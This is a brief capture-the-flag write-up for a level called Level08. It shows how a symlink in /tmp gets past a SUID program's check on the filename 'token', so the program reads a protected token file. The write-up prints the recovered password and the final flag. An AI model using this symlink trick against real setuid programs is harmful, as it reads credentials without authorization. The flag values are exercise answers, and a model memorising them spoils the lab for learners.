### Level08

-SUID plus a token file in home directory

-strings on SUID so he takes a file and open it then print the content of file

-and we can’t give it a file named token

-I create a  link to token in tmp : 

```
ln -s /home/user/level08/token /tmp/y (we can’t name the file token)
```
-then executed the SUID with the link : 
```
./level08 /tmp/y => quif5eloekouj29ke0vouxean
```
-its the password to the user flag08

-getflag => 25749xKZ8L7DkSCwJkT9dyv6f
